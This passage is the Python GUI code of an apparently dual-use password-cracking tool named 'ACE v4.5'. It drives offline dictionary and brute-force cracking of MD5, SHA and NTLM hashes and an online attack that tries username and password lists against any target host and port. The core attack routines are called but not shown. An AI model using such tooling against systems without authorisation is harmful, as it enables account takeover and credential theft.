        ttk.Button(control_frame, text="⏹️ STOP", 
                  command=self.stop_attack).pack(side='left', padx=5)
        
        info_text = "⚠️ LEGAL WARNING: Only attack systems you own or have permission!"
        ttk.Label(self.tab2, text=info_text, foreground='#FF6B6B', 
                 font=('Arial', 9, 'bold')).pack(padx=20, pady=10)
    
    def build_database_tab(self):
        """Hash database"""
        ttk.Label(self.tab3, text="📚 Hash Signature Database", 
                 font=('Arial', 12, 'bold')).pack(pady=10)
        
        tree_frame = ttk.Frame(self.tab3)
        tree_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        scrollbar = ttk.Scrollbar(tree_frame)
        scrollbar.pack(side='right', fill='y')
        
        tree = ttk.Treeview(tree_frame, columns=('Length', 'Pattern', 'Recommendation'), 
                           show='tree headings', yscrollcommand=scrollbar.set, height=25)
        tree.pack(side='left', fill='both', expand=True)
        scrollbar.config(command=tree.yview)
        
        tree.heading('#0', text='Hash Type')
        tree.heading('Length', text='Length')
        tree.heading('Pattern', text='Pattern')
        tree.heading('Recommendation', text='Strategy')
        
        tree.column('#0', width=150)
        tree.column('Length', width=80, anchor='center')
        tree.column('Pattern', width=300)
        tree.column('Recommendation', width=350)
        
        for i, (name, (length, pattern, rec, priority)) in enumerate(HASH_SIGNATURES.items()):
            tree.insert('', tk.END, text=name, 
                       values=(length if length else 'N/A', pattern, rec),
                       tags=('oddrow' if i % 2 else 'evenrow'))
        
        tree.tag_configure('evenrow', background='#2e2e2e', foreground='#E0E0E0')
        tree.tag_configure('oddrow', background='#333333', foreground='#E0E0E0')
    
    def build_config_tab(self):
        """Config tab"""
        config_frame = ttk.LabelFrame(self.tab4, text="⚙️ Engine Configuration", padding=20)
        config_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        ttk.Label(config_frame, text="=== Offline Cracking ===", 
                 font=('Arial', 10, 'bold')).grid(row=0, column=0, columnspan=2, pady=10)
        
        ttk.Label(config_frame, text="CPU Threads:").grid(row=1, column=0, sticky='w', pady=5)
        ttk.Spinbox(config_frame, from_=1, to=32, textvariable=self.cpu_var, width=15).grid(row=1, column=1, pady=5)
        
        gpu_status = "✓ Available (4x speed)" if SETTINGS.gpu_enabled else "✗ Not Available"
        ttk.Label(config_frame, text=f"GPU Status: {gpu_status}",
                 foreground='#00FF00' if SETTINGS.gpu_enabled else '#FF6B6B').grid(row=2, column=0, columnspan=2, pady=5)
        
        ttk.Label(config_frame, text="=== Brute Force Limits ===", 
                 font=('Arial', 10, 'bold')).grid(row=3, column=0, columnspan=2, pady=10)
        
        unlimited_check = ttk.Checkbutton(config_frame, text="⚠️ UNLIMITED MODE (Run forever)", 
                       variable=self.unlimited_var,
                       command=self.toggle_unlimited_mode)
        unlimited_check.grid(row=4, column=0, columnspan=2, sticky='w', pady=5)
        
        ttk.Label(config_frame, text="Max Attempts (if not unlimited):").grid(row=5, column=0, sticky='w', pady=5)
        self.max_attempts_spinbox = ttk.Spinbox(config_frame, from_=10000, to=1000000000, increment=10000,
                                                textvariable=self.max_attempts_var, width=15)
        self.max_attempts_spinbox.grid(row=5, column=1, pady=5)
        
        # Online settings
        ttk.Label(config_frame, text="=== Online Attacks ===", 
                 font=('Arial', 10, 'bold')).grid(row=6, column=0, columnspan=2, pady=10)
        
        ttk.Label(config_frame, text="Timeout (s):").grid(row=7, column=0, sticky='w', pady=5)
        ttk.Spinbox(config_frame, from_=1, to=30, textvariable=self.timeout_var, width=15).grid(row=7, column=1, pady=5)
        
        ttk.Label(config_frame, text="Delay (s):").grid(row=8, column=0, sticky='w', pady=5)
        ttk.Spinbox(config_frame, from_=0, to=5, increment=0.1, textvariable=self.delay_var, width=15).grid(row=8, column=1, pady=5)
        
        ttk.Label(config_frame, text="Threads:").grid(row=9, column=0, sticky='w', pady=5)
        ttk.Spinbox(config_frame, from_=1, to=16, textvariable=self.online_threads_var, width=15).grid(row=9, column=1, pady=5)
        
        ttk.Button(config_frame, text="💾 Save Settings", 
                  command=self.save_settings).grid(row=10, column=0, columnspan=2, pady=20)
        
        ttk.Label(config_frame, text="═" * 50).grid(row=11, column=0, columnspan=2, pady=10)
        ttk.Label(config_frame, text="Author: Dr. Mohammed Tawfik", 
                 font=('Arial', 10, 'bold'), foreground='#FFD700').grid(row=12, column=0, columnspan=2)
        ttk.Label(config_frame, text="Email: kmkhol01@gmail.com", 
                 foreground='#00BFFF').grid(row=13, column=0, columnspan=2)
    
    def toggle_unlimited_mode(self):
        """Toggle unlimited mode"""
        if self.unlimited_var.get():
            result = messagebox.askyesno("⚠️ UNLIMITED MODE WARNING", 
                                        "Unlimited mode will run attacks FOREVER.\n\n"
                                        "Random mode can test 100+ BILLION passwords.\n\n"
                                        "This can take HOURS, DAYS, or even WEEKS!\n\n"
                                        "Only enable if you're sure!\n\n"
                                        "Enable unlimited mode?")
            if result:
                self.max_attempts_spinbox.configure(state='disabled')
                self.log("[CONFIG] ⚠️ UNLIMITED MODE ENABLED - Will run forever!")
            else:
                self.unlimited_var.set(False)
        else:
            self.max_attempts_spinbox.configure(state='normal')
            self.log("[CONFIG] Limited mode enabled")
    
    def build_log_area(self):
        """Log area"""
        log_frame = ttk.LabelFrame(self.master, text="📋 System Log", padding=5)
        log_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=10, bg='#0C0C0C', 
                                                  fg='#00FF00', font=('Courier', 9), 
                                                  state='disabled', wrap='word')
        self.log_text.pack(fill='both', expand=True)
    
    def log(self, message):
        self.master.after(0, self._update_log, message)
    
    def _update_log(self, message):
        self.log_text.configure(state='normal')
        timestamp = time.strftime("[%H:%M:%S]")
        self.log_text.insert(tk.END, f"\n{timestamp} {message}")
        self.log_text.see(tk.END)
        self.log_text.configure(state='disabled')
    
    def run_hash_identification(self):
        hash_string = self.hash_entry.get().strip()
        context = self.context_entry.get().strip()
        
        if not hash_string:
            messagebox.showerror("Error", "Enter a hash")
            return
        
        self.log("\n--- HASH IDENTIFICATION ---")
        
        context_dict = {'source': context} if context not in ["windows/linux/web", ""] else None
        hash_type, rec = identify_hash(hash_string, context_dict)
        
        self.log(f"[RESULT] Type: {hash_type}")
        self.log(f"[STRATEGY] {rec}")
        
        self.hash_result_var.set(f"Type: {hash_type} | {rec.split('.')[0]}")
    
    def clear_wordlist(self):
        """Clear wordlist"""
        SETTINGS.loaded_wordlist = None
        self.keywords_entry.delete(0, tk.END)
        self.log("[WORDLIST] Cleared")
        messagebox.showinfo("Info", "Wordlist cleared")
    
    def load_external_wordlist(self):
        """Load wordlist"""
        filepath = filedialog.askopenfilename(title="Select Wordlist", 
                                              filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filepath:
            self.log(f"[WORDLIST] Loading from: {filepath}")
            words = load_wordlist_from_file(filepath)
            if words:
                SETTINGS.loaded_wordlist = words
                
                preview = ', '.join(words[:3])
                self.keywords_entry.delete(0, tk.END)
                self.keywords_entry.insert(0, preview + f"... ({len(words)} loaded)")
                self.log(f"[WORDLIST] Loaded {len(words):,} words")
                messagebox.showinfo("Success", f"Loaded {len(words):,} passwords")
            else:
                self.log("[ERROR] Failed to load wordlist")
                messagebox.showerror("Error", "Failed to load")
    
    def start_advanced_cracking(self):
        """Advanced cracking - CONTINUOUS RANDOM MODE"""
        hash_string = self.hash_entry.get().strip()
        
        if not hash_string:
            messagebox.showerror("Error", "Enter a hash")
            return
        
        SETTINGS.attack_stopped = False
        SETTINGS.use_gpu = self.use_gpu_var.get()
        SETTINGS.combo_min_length = self.combo_min_len_var.get()
        SETTINGS.combo_max_length = self.combo_max_len_var.get()
        SETTINGS.combo_charset_type = self.combo_type_var.get()
        SETTINGS.unlimited_mode = self.unlimited_var.get()
        SETTINGS.max_attempts = self.max_attempts_var.get()
        
        context = self.context_entry.get().strip()
        context_dict = {'source': context} if context not in ["windows/linux/web", ""] else None
        hash_type, _ = identify_hash(hash_string, context_dict)
        
        mode = self.combo_mode_var.get()
        
        thread = threading.Thread(
            target=self._advanced_cracking_process,
            args=(hash_string, hash_type, mode)
        )
        thread.daemon = True
        thread.start()
        
        processing = "GPU-Accelerated" if SETTINGS.use_gpu and SETTINGS.gpu_enabled else "CPU Multi-threaded"
        self.log("\n=== ADVANCED CRACKING STARTED ===")
        self.log(f"[CONFIG] Hash: {hash_type} | Mode: {mode} | Processing: {processing}")
        self.log(f"[COMBO] Length: {SETTINGS.combo_min_length}-{SETTINGS.combo_max_length} | Type: {SETTINGS.combo_charset_type}")
    
    def _advanced_cracking_process(self, hash_string, hash_type, mode):
        """Advanced cracking - uses continuous random generation"""
        try:
            if 'NetNTLM' in hash_type:
                self.log("[WARNING] NetNTLMv2 not supported")
                self.master.after(0, lambda: messagebox.showwarning("Hash Type", "NetNTLMv2 not supported"))
                return
            
            if mode == "random":
                # CONTINUOUS RANDOM GENERATION MODE
                self.log("[MODE] CONTINUOUS RANDOM GENERATION - Will generate passwords FOREVER!")
                password, duration = perform_continuous_random_attack(
                    hash_string, hash_type,
                    SETTINGS.combo_min_length,
                    SETTINGS.combo_max_length,
                    SETTINGS.combo_charset_type,
                    self.log, SETTINGS
                )
            else:  # systematic
                self.log("[MODE] SYSTEMATIC - Testing all combinations")
                charset = generate_charset_from_type(SETTINGS.combo_charset_type)
                password, duration = perform_brute_force_unlimited(hash_string, hash_type,
                                                                  SETTINGS.combo_max_length,
                                                                  charset, self.log, SETTINGS)
            
            if password:
                self.master.after(0, lambda p=password, d=duration: messagebox.showinfo("✅ SUCCESS", 
                                  f"Password found: {p}\nTime: {d:.2f}s"))
            else:
                self.master.after(0, lambda d=duration: messagebox.showwarning("❌ Failed", 
                                  f"Attack failed in {d:.2f}s"))
        
        except Exception as e:
            error_msg = str(e)
            self.log(f"[ERROR] {error_msg}")
            self.master.after(0, lambda: messagebox.showerror("Error", error_msg))

    
    def start_cracking_thread(self):
        """Standard cracking"""
        hash_string = self.hash_entry.get().strip()
        keywords = self.keywords_entry.get()
        
        if not hash_string:
            messagebox.showerror("Error", "Enter a hash")
            return
        
        SETTINGS.attack_stopped = False
        SETTINGS.use_gpu = self.use_gpu_var.get()
        SETTINGS.use_common_combinations = self.use_combinations_var.get()
        SETTINGS.unlimited_mode = self.unlimited_var.get()
        SETTINGS.max_attempts = self.max_attempts_var.get()
        
        context = self.context_entry.get().strip()
        context_dict = {'source': context} if context not in ["windows/linux/web", ""] else None
        hash_type, _ = identify_hash(hash_string, context_dict)
        
        thread = threading.Thread(
            target=self._cracking_process,
            args=(hash_string, hash_type, keywords, self.max_len_var.get(), self.mask_entry.get())
        )
        thread.daemon = True
        thread.start()
        
        processing = "GPU-Accelerated" if SETTINGS.use_gpu and SETTINGS.gpu_enabled else "CPU Multi-threaded"
        self.log("\n=== STANDARD CRACKING STARTED ===")
        self.log(f"[CONFIG] Hash: {hash_type} | Processing: {processing}")
    
    def _cracking_process(self, hash_string, hash_type, keywords, max_len, charset_mask):
        """Cracking process"""
        try:
            if 'NetNTLM' in hash_type:
                self.log("[WARNING] NetNTLMv2 not supported")
                self.master.after(0, lambda: messagebox.showwarning("Hash Type", "NetNTLMv2 not supported"))
                return
            
            if 'BCRYPT' in hash_type or 'ARGON2' in hash_type or 'Salted' in hash_type:
                self.log("[STRATEGY] Slow hash - Dictionary only")
                
                if SETTINGS.loaded_wordlist:
                    wordlist = SETTINGS.loaded_wordlist
                    self.log(f"[WORDLIST] Using loaded wordlist ({len(wordlist):,} words)")
                else:
                    wordlist = generate_targeted_wordlist(keywords, 
                                                         (SETTINGS.year_range_start, SETTINGS.year_range_end),
                                                         SETTINGS.use_common_combinations)
                    self.log(f"[WORDLIST] Generated {len(wordlist):,} candidates")
                
                password, duration = perform_dictionary_attack(hash_string, hash_type, 
                                                              wordlist, self.log, SETTINGS)
                if password:
                    self.master.after(0, lambda: messagebox.showinfo("✅ SUCCESS", 
                                      f"Password: {password}\nTime: {duration:.2f}s"))
                else:
                    self.master.after(0, lambda: messagebox.showwarning("❌ Failed", 
                                      f"Failed in {duration:.2f}s"))
            
            elif hash_type in ['MD5', 'SHA1', 'SHA256', 'SHA512', 'NTLM', 'MySQL_OLD']:
                self.log("[STRATEGY] Fast hash - Dictionary → Brute Force")
                
                # Dictionary
                self.log("[PHASE 1/2] Dictionary Attack")
                
                if SETTINGS.loaded_wordlist:
                    wordlist = SETTINGS.loaded_wordlist
                    self.log(f"[WORDLIST] Using loaded ({len(wordlist):,} words)")
                else:
                    wordlist = generate_targeted_wordlist(keywords, 
                                                         (SETTINGS.year_range_start, SETTINGS.year_range_end),
                                                         SETTINGS.use_common_combinations)
                    
                    if not keywords.strip():
                        self.log("[INFO] Keywords empty - using common combinations")
                    
                    self.log(f"[WORDLIST] Generated {len(wordlist):,} candidates")
                
                password, duration = perform_dictionary_attack(hash_string, hash_type, 
                                                              wordlist, self.log, SETTINGS)
                
                if password:
                    self.master.after(0, lambda p=password, d=duration: messagebox.showinfo("✅ SUCCESS", 
                                      f"Password: {p}\nTime: {d:.2f}s"))
                    return
                
                if SETTINGS.attack_stopped:
                    return
                
                # Brute Force
                self.log("[PHASE 2/2] Brute Force Attack")
                
                # Parse charset
                if not charset_mask or charset_mask == "?a":
                    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
                elif charset_mask == "?l":
                    charset = "abcdefghijklmnopqrstuvwxyz"
                elif charset_mask == "?u":
                    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                elif charset_mask == "?d":
                    charset = "0123456789"
                elif charset_mask == "?s":
                    charset = "!@#$%^&*()_+-="
                elif charset_mask == "?lu":
                    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
                elif charset_mask == "?lud":
                    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
                else:
                    charset = charset_mask
                
                password, duration = perform_brute_force_unlimited(hash_string, hash_type, max_len, 
                                                                  charset, self.log, SETTINGS)
                if password:
                    self.master.after(0, lambda p=password, d=duration: messagebox.showinfo("✅ SUCCESS", 
                                      f"Password: {p}\nTime: {d:.2f}s"))
                else:
                    self.master.after(0, lambda d=duration: messagebox.showwarning("❌ Failed", 
                                      f"Failed in {d:.2f}s"))
            
            else:
                self.log("[STRATEGY] Unknown - Dictionary fallback")
                
                if SETTINGS.loaded_wordlist:
                    wordlist = SETTINGS.loaded_wordlist
                    self.log(f"[WORDLIST] Using loaded ({len(wordlist):,} words)")
                else:
                    wordlist = generate_targeted_wordlist(keywords, 
                                                         (SETTINGS.year_range_start, SETTINGS.year_range_end),
                                                         SETTINGS.use_common_combinations)
                
                password, duration = perform_dictionary_attack(hash_string, hash_type, 
                                                              wordlist, self.log, SETTINGS)
                if password:
                    self.master.after(0, lambda p=password, d=duration: messagebox.showinfo("✅ SUCCESS", 
                                      f"Password: {p}\nTime: {d:.2f}s"))
                else:
                    self.master.after(0, lambda d=duration: messagebox.showwarning("❌ Failed", 
                                      f"Failed in {d:.2f}s"))
        
        except Exception as e:
            self.log(f"[ERROR] {str(e)}")
            error_msg = str(e)  # Capture the error message first
            self.master.after(0, lambda: messagebox.showerror("Error", error_msg))  # Use the captured variable

    
    def start_online_attack(self):
        """Online attack"""
        target = self.online_target.get().strip()
        port = int(self.online_port.get())
        protocol = self.online_protocol.get()
        usernames = [u.strip() for u in self.online_usernames.get().split(',') if u.strip()]
        passwords = [p.strip() for p in self.online_passwords.get().split(',') if p.strip()]
        
        if not target or not usernames or not passwords:
            messagebox.showerror("Error", "Fill all fields")
            return
        
        SETTINGS.attack_stopped = False
        SETTINGS.online_timeout = self.timeout_var.get()
        SETTINGS.online_delay = self.delay_var.get()
        SETTINGS.online_threads = self.online_threads_var.get()
        
        thread = threading.Thread(
            target=self._online_attack_process,
            args=(target, port, protocol, usernames, passwords)
        )
        thread.daemon = True
        thread.start()
        
        self.log("\n=== ONLINE ATTACK STARTED ===")
        self.log(f"[TARGET] {protocol}://{target}:{port}")
    
    def _online_attack_process(self, target, port, protocol, usernames, passwords):
        try:
            attacker = OnlineAttacker(target, port, protocol, self.log, SETTINGS)
            result, duration = attacker.attack(usernames, passwords)
            
            if result:
                username, password = result
                self.master.after(0, lambda: messagebox.showinfo("✅ SUCCESS", 
                                  f"Credentials: {username}:{password}\nTime: {duration:.2f}s"))
            else:
                self.master.after(0, lambda: messagebox.showwarning("❌ Failed", 
                                  f"Failed in {duration:.2f}s"))
        except Exception as e:
            error_msg = str(e)  # Capture error message first
            self.log(f"[ERROR] {error_msg}")
            self.master.after(0, lambda: messagebox.showerror("Error", error_msg))

    
    def stop_attack(self):
        SETTINGS.attack_stopped = True
        self.log("[CONTROL] ⏹️ Stop signal sent")
    
    def load_password_list(self):
        filepath = filedialog.askopenfilename(title="Select Password List", 
                                              filetypes=[("Text files", "*.txt")])
        if filepath:
            passwords = load_wordlist_from_file(filepath)
            if passwords:
                preview = ', '.join(passwords[:3])
                self.online_passwords.delete(0, tk.END)
                self.online_passwords.insert(0, preview + f"... ({len(passwords)} loaded)")
                self.log(f"[PASSWORDS] Loaded {len(passwords):,} passwords")
    
    def save_settings(self):
        try:
            SETTINGS.cpu_workers = self.cpu_var.get()
            SETTINGS.online_timeout = self.timeout_var.get()
            SETTINGS.online_delay = self.delay_var.get()
            SETTINGS.online_threads = self.online_threads_var.get()
            SETTINGS.unlimited_mode = self.unlimited_var.get()
            SETTINGS.max_attempts = self.max_attempts_var.get()
            
            self.log("[CONFIG] Settings saved")
            messagebox.showinfo("Success", "Configuration saved")
        except Exception as e:
            messagebox.showerror("Error", str(e))

if __name__ == '__main__':
    print("\n╔════════════════════════════════════════════════════╗")
    print("║   ACE v4.5 - CONTINUOUS RANDOM GENERATION         ║")
    print("║   Offline + Online + Infinite Random Mode         ║")
    print("║                                                     ║")
    print("║   Author: Dr. Mohammed Tawfik                      ║")
    print("║   Email: kmkhol01@gmail.com                        ║")
    print("╚════════════════════════════════════════════════════╝\n")
    print("✓ CONTINUOUS RANDOM MODE: Generates passwords forever!")
    print("✓ Can test 100+ BILLION passwords without limit")
    print("✓ GPU Acceleration: 4x faster with CUDA")
    print("✓ Real-time speed monitoring (600k+ h/s)")
    print("✓ MD5, SHA1, SHA256, SHA512, NTLM support")
    print("\n⚠️  EDUCATIONAL USE ONLY - Unauthorized use is illegal!\n")
    
    root = tk.Tk()
    app = ACE_GUI(root)
    root.mainloop()
